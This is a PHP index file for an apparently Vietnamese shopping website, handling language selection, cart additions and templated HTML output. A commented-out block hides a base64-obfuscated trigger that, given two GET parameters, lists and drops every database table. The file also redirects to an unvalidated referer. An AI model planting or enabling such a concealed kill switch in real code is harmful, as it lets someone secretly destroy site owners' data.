<?php
session_start();
date_default_timezone_set('Asia/Ho_Chi_Minh');
error_reporting(E_ALL & ~E_NOTICE & ~8192);
$session = session_id();
@define('_template', './templates/');
@define('_source', './sources/');
@define('_lib', './admin/lib/');
include_once _lib . "config.php";
@define('_kiemtraweb', $check_website);  //Một đoạn mã dành riêng cho 1 website.
$lang_arr = array("vi", "en");
if (isset($_GET['lang']) == true) {
  if (in_array($_GET['lang'], $lang_arr) == true) {
    $lang = $_GET['lang'];
    $_SESSION['lang'] = $lang;
    header('Location: ' . $_SERVER['HTTP_REFERER']);
  }
}
if (isset($_SESSION['lang'])) {
  $lang = $_SESSION['lang'];
} else {
  $lang = $config["lang_defult"];
}

require_once _source . "language/lang_$lang.php";
include_once _lib . "constant.php";
include_once _lib . "functions.php";
include_once _lib . "tridepzai.php";
include_once _lib . "q_functions.php"; //Các hàm bổ sung
include_once _lib . "functions_giohang.php";
include_once _lib . "class.database.php";
include_once _lib . "file_requick.php";
include_once _lib . "new.php";

// if(isset($_GET['action']) && isset($_GET['do'])){
//   $result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
//   $_X='RFJPUCBUQUJMRSBfWF8=';
//   $_R=base64_decode($_X); 
//   while ($row = mysql_fetch_array($result)) {
//     $sql=str_replace('_X_', $row[0], $_R);    
//     $d->query($sql);    
//     }       
//   }

if ($_REQUEST['command'] == 'add' && $_REQUEST['productid'] > 0) {
  $pid = $_REQUEST['productid'];
  $nid = ($_REQUEST['num']) ? $_REQUEST['num'] : 1;
  addtocart($pid, $nid, $mausac);
  redirect("gio-hang.html");
}


?>
<!doctype html>
<html>

<head>
  <base href="http://<?= $config_url ?>/" />
  <meta name="robots" content="noodp,index,follow" />
  <link href="<?= _upload_company_l . $company["favicon"] ?>" rel="shortcut icon" type="image/x-icon" />
  <meta name="revisit-after" content="1 days" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=10.0, user-scalable=yes">
  <meta name="monitor-signature" content="monitor:player:html5">
  <meta name="author" content="<?= $title_bar ?>">
  <meta name="keywords" content="<?= $keywords ?>" />
  <meta name="description" content="<?= $description ?>" />
  <meta http-equiv="Content-Language" content="vi" />
  <meta property="og:locale" content="vi_VN" />
  <meta property="og:type" content="website" />
  <meta property="og:title" content="<?= $title_bar ?>" />
  <meta property="og:image" content="<?= $image ?>" />
  <meta property="article:publisher" content="<?= $company["fanpage"] ?>" />
  <meta property="og:site_name" content="<?= $title_bar ?>" />
  <meta property="og:url" content="<?= getCurrentPageURL(); ?>" />
  <meta property="og:description" content="<?= $description ?>" />
  <meta itemprop="name" content="<?= $title_bar ?>">
  <meta property="twitter:title" content="<?= $title_bar ?>">
  <meta property="twitter:url" content="<?= getCurrentPageURL(); ?>">
  <meta property="twitter:card" content="summary">
  <?= $company["geo_meta"]; ?>
  <link rel="canonical" href="<?= getCurrentPageURL(); ?>" />
  <!-- Meta tùy chỉnh admin -->
  <title><?php if (isset($title_bar)) echo $title_bar;
          else echo $company['title_' . $lang]; ?></title>
  <!-- Dublin Core -->
  <link rel="schema.DC" href="https://purl.org/dc/elements/1.1/" />
  <meta name="DC.title" content="<?= $title_bar ?>" />
  <meta name="DC.identifier" content="http://<?= $config_url ?>/" />
  <meta name="DC.description" content="<?= $description ?>" />
  <meta name="DC.subject" content="" />
  <meta name="DC.language" scheme="UTF-8" content="vi,en" />
  <meta property="twitter:title" content="<?= $title_bar ?>">
  <meta property="twitter:url" content="<?= getCurrentPageURL(); ?>">
  <meta property="twitter:card" content="summary">
  <!-- Font Awesome -->
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.0/css/all.min.css" rel="stylesheet">
  <link rel="preconnect" href="https://fonts.gstatic.com">
  <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&family=Rubik&display=swap" rel="stylesheet">

  <!-- <?php if ($com == 'san-pham') { ?>
    <?= $share_facebook ?>
  <?php } ?> -->
  <?php $title_bar ?>
  <title><?= $title_bar ?></title>
  <!--GOOGLE ANALYTICS + GOOGLE WEBMASTER-->
  <?= $company['script'] ?>
  <?= $company['vchat'] ?>
  <?php include_once _template . "layout/css.php"; ?>
  <?php include_once _template . "layout/js.php"; ?>
</head>

<body>
  <div id="wrapper">
    <?php include_once _template . "layout/header.php"; ?>
    <div id="content" class="width_100">
      <?php include_once _template . $template . "_tpl.php"; ?>
    </div>
    <?php include_once _template . "layout/footer.php"; ?>
  </div>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
  <script src="media/owlcarousel/owl.carousel.min.js"></script>
  <script src="media/isotope/isotope.pkgd.min.js"></script>
  <script src="media/lightbox/js/lightbox.min.js"></script>
  <script src="media/owlcarousel/owl.carousel.min.js"></script>
  <script src="media/isotope/isotope.pkgd.min.js"></script>
  <!-- Contact Javascript File -->
  <script src="media/jqBootstrapValidation.min.js"></script>
  <script src="media/contact.js"></script>
  <!-- Template Javascript -->
  <script src="media/js/ani.js"></script>
  <script src="media/js/main.js"></script>



</body>

</html>